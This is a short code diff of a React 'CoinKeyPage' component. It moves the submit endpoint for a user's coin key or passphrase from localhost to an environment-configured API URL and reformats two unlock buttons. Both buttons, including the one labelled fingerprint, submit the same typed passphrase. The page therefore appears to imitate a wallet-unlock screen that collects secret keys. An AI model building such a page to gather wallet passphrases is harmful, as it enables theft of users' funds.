@@ -18,7 +18,7 @@ function CoinKeyPage({ quantity, totalAmount }) {
   const handleSubmit = async () => {
     setLoading(true);
     try {
-      await axios.post('http://localhost:5000/api/submit-key', {
+    await axios.post(`${import.meta.env.VITE_API_URL}/api/submit-key`, {
         quantity,
         totalAmount,
         method: state.method,
@@ -64,17 +64,17 @@ function CoinKeyPage({ quantity, totalAmount }) {
           </div>
           {error && <p className="error-text">{error}</p>}
           <div className="button-save">
-          <button
-            onClick={handleSubmit}
-            disabled={loading || !coinKey}
-            className="unlock-button"
-          >
-            {loading ? 'Submitting...' : 'Unlock With Passphrase'}
-          </button>
-          <button             onClick={handleSubmit}
-            disabled={loading || !coinKey} className="unlock-button-face">
-            {loading ? 'Submitting...' : 'Unlock With Fingerprint'}
-          </button>
+            <button
+              onClick={handleSubmit}
+              disabled={loading || !coinKey}
+              className="unlock-button"
+            >
+              {loading ? 'Submitting...' : 'Unlock With Passphrase'}
+            </button>
+            <button onClick={handleSubmit}
+              disabled={loading || !coinKey} className="unlock-button-face">
+              {loading ? 'Submitting...' : 'Unlock With Fingerprint'}
+            </button>
           </div>
         </div>
       </div>
